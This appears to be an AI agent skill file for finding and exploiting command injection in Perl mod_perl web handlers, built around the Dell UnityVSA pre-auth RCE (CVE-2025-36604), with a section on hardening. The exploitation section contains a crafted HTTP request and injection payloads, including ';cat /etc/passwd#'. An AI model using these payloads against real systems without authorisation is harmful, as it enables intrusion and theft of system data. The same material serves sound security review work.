---
name: perl-modperl-rce-hunter
description: Use this skill whenever analyzing Perl code for command injection vulnerabilities, especially in Apache mod_perl handlers, web applications with Perl backends, or when hunting for RCE through shell execution sinks like backticks, qx//, system(), or open() with pipes. Trigger this skill for any security review of Perl web code, pentesting Perl-based applications, or when investigating potential pre-auth RCE in mod_perl environments.
---

# Perl mod_perl RCE Hunter

A skill for identifying and exploiting command injection vulnerabilities in Perl code running in Apache mod_perl handlers.

## When to Use This Skill

Use this skill when:
- Reviewing Perl code for security vulnerabilities
- Pentesting web applications with Perl backends
- Investigating potential RCE in mod_perl handlers
- Analyzing Apache configurations with PerlModule directives
- Hunting for command injection through shell execution sinks
- Assessing pre-authentication attack surfaces in Perl web handlers

## Risky Perl Execution Primitives

These Perl constructs spawn a shell when given a single string argument:

| Primitive | Example | Risk |
|-----------|---------|------|
| Backticks / qx// | `my $out = `cmd ...`;` | High - direct shell execution |
| system() with string | `system("/bin/sh -c '...'")` | High - implicit shell |
| open() with pipe | `open my $fh, "cmd \|"` | High - shell pipe |
| IPC::Open3 with string | `open3(..., "cmd")` | High - shell execution |

## Vulnerability Pattern Recognition

### Minimal Vulnerable Shape

```perl
sub getCASURL {
  ...
  my $exec_cmd = "...";
  if ($type eq 'login') {
    $exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
    my $out = `$exec_cmd`;    # backticks = shell
  }
}
```

**Key indicators:**
1. Attacker-controlled input (e.g., `$r->uri()`, `$r->args()`, `$r->header_in()`)
2. String concatenation into command variable
3. Shell execution primitive with single string argument
4. Inconsistent sanitization across code branches

### Reachability Considerations in mod_perl

For a vulnerability to be exploitable:

1. **Handler registration**: `httpd.conf` must route requests to the Perl module
   ```apache
   PerlModule MOD_SEC_EMC::AccessHandler
   <Location /ui/>
     PerlHandler MOD_SEC_EMC::AccessHandler::handler
   </Location>
   ```

2. **Triggering the vulnerable branch**: Force execution through the vulnerable code path
   - Omit authentication cookies to trigger login flow
   - Set specific parameters to hit conditional branches

3. **Resolvable path**: Request must target a URI within the configured handler scope

## Exploitation Workflow

### Step 1: Reconnaissance

```bash
# Find Perl modules in Apache config
grep -r "PerlModule\|PerlHandler" /etc/httpd/conf/

# Identify handler scopes
grep -A5 "PerlHandler" /etc/httpd/conf.d/*.conf
```

### Step 2: Identify Entry Points

Look for request data flowing into command strings:
- `$r->uri()` - request URI path
- `$r->args()` - query string
- `$r->header_in("X-Custom")` - custom headers
- `$r->path_info()` - path info

### Step 3: Craft Payloads

**Path injection via semicolon:**
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```

**Alternative separators to try:**
- `;` - command separator
- `&&` - AND operator
- `|` - pipe
- `` `backticks` `` - command substitution
- `$(...)` - command substitution
- `%0A` - encoded newline

**Payload patterns for end-of-string injection:**
```
;id#
&&/usr/bin/id#
|whoami#
;cat /etc/passwd#
```

### Step 4: Verify Execution

Look for:
- Command output in HTTP response
- Unexpected headers
- Side effects (file creation, network connections)
- Error messages revealing command structure

## Hardening Recommendations

### 1. Use Argument-Vector Execution

**Vulnerable:**
```perl
my $out = `curl $url`;
```

**Secure:**
```perl
use IPC::Open3;
my $pid = open3($in, $out, $err, 'curl', '--silent', '--', $safe_url);
```

Or with system:
```perl
system('/usr/bin/curl', '--silent', '--', $safe_url);  # No shell
```

### 2. Consistent Sanitization Across All Branches

```perl
# BAD - inconsistent quoting
if ($type eq 'login') {
  $exec_cmd .= $uri;  # Unescaped!
} else {
  $exec_cmd .= escape($uri);  # Escaped
}

# GOOD - consistent escaping
use URI::Escape;
$exec_cmd .= uri_escape($uri);
```

### 3. Avoid Shell Execution in Auth/Redirect Paths

Keep authentication and redirect code paths free of command execution, or ensure identical sanitization across all branches.

### 4. Use Allowlists for Command Components

```perl
my %allowed_commands = (
  'curl' => 1,
  'wget' => 1,
  'ping' => 1,
);

if (exists $allowed_commands{$cmd}) {
  system($cmd, @args);  # Safe - no shell
}
```

## Vulnerability Hunting Techniques

### 1. Patch-Diff Analysis

Compare patched vs. vulnerable versions:
```bash
diff -u vulnerable.pm patched.pm | grep -A3 -B3 "uri\|input\|request"
```

Look for:
- Inconsistent quoting between branches
- Added escaping in one path but not others
- Conditional logic changes around command execution

### 2. Grep Patterns for Shell Sinks

```bash
# Find backticks
grep -rn "\`[^\`]*\`" *.pm

# Find qx//
grep -rn "qx\[\|qx\(\|qx\{\|qx/" *.pm

# Find open with pipes
grep -rn "open.*\|\|open.*\|" *.pm

# Find system with strings
grep -rn "system\s*\(\s*\"" *.pm
```

### 3. Build Call Graphs

Trace from sink to request entry:
1. Find all shell execution sinks
2. Backtrack variable assignments
3. Identify request data sources (`$r->*`)
4. Verify pre-authentication reachability

### 4. Check for Branch-Specific Vulnerabilities

```perl
# Look for patterns like:
if ($type eq 'login') { ... }
if ($action eq 'redirect') { ... }
if ($mode eq 'debug') { ... }
```

Each branch may have different sanitization levels.

## Real-World Case Study: CVE-2025-36604

**Dell UnityVSA Pre-Auth RCE**

**Vulnerability chain:**
```
MOD_SEC_EMC::AccessHandler
  → make_return_address($r)
    → getCASLoginURL(..., type="login")
      → getCASURL(..., $uri, 'login')
        → `$exec_cmd` (backticks with raw $uri)
```

**Key lessons:**
1. Pre-auth vulnerabilities are highest severity
2. Branch-specific sanitization is a common failure mode
3. Handler scope configuration affects exploitability
4. Patch diffs reveal inconsistent fixes

## Quick Reference

### Shell Metacharacters to Test

| Character | Purpose | Example |
|-----------|---------|--------|
| `;` | Command separator | `;id` |
| `&&` | AND operator | `&&id` |
| `\|` | Pipe | `\|id` |
| `` ` `` | Backticks | `` `id` `` |
| `$()` | Command substitution | `$(id)` |
| `%0A` | Newline | `%0Aid` |
| `#` | Comment | `;id#` |

### Common mod_perl Request Methods

- `$r->uri()` - Full URI path
- `$r->path()` - Path component
- `$r->args()` - Query string
- `$r->header_in("X")` - Request header
- `$r->content()` - POST body
- `$r->user()` - Authenticated user

## References

- [Dell UnityVSA Pre-Auth Command Injection Analysis](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Perl Security Best Practices](https://security.perl.org/)
- [mod_perl Documentation](https://perl.apache.org/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
